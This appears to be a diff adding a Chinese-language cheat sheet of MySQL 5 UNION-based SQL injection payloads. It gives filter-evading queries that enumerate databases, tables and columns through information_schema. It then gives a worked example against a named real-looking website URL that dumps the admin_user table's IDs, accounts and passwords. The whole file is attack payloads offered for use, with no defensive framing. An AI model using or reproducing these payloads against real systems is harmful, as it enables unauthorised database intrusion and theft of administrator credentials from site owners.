@@ -1,0 +1,31 @@
+查库
+
+id=-1 union select 1,..,SCHEMA_NAME,n  from/**/information_schema.SCHEMATA limit 1,1/*
+
+查表
+
+id=-1/**/union/**/select/**/1,TABLE_NAME,N/**/from/**/information_schema.TABLES/**/where/**/TABLE_SCHEMA=库的HEX值/**/limit/**/1,1
+
+查段
+
+id=-1/**/union/**/select/**/1,COLUMN_NAME,N/**/from/**/information_schema.COLUMNS/**/where/**/TABLE_NAME=表的HEX值/**/limit/**/1,1
+
+
+mysql5高级注入方法暴表
+
+例子如下:
+
+1.爆表
+http://ccaus.youngd.cn/ccaus_content.php?ccausid=13240/**/and/**/1=2/**/union/**/select/**/1,2,3,TABLE_NAME,5/**/From/**/information_schema.TABLES/**/Where/**/TABLE_SCHEMA=0x79645F7465616D6E6574/**/limit/**/0,1/*    (0x79645F7465616D6E6574为数据库名的16进制转换yd_teamnet)
+这样爆到第4个时出现了admin_user表。
+
+2.暴字段
+http://ccaus.youngd.cn/ccaus_content.php?ccausid=13240/**/and/**/1=2/**/union/**/select/**/1,2,3,COLUMN_NAME,5/**/From/**/information_schema.COLUMNS/**/Where/**/TABLE_NAME=0x61646D696E5F75736572/**/And/**/TABLE_SCHEMA=0x79645F7465616D6E6574/**/limit/**/0,1/*
+
+
+3.爆密码
+http://ccaus.youngd.cn/ccaus_content.php?ccausid=13240/**/and/**/1=2/**/union/**/select/**/1,2,3,concat(0x7c,ID,0x7c,ACCOUNT,0x7c,PASSWORD,0x7c),5/**/From/**/admin_user/**/limit/**/0,1/* 
+
+
+
+
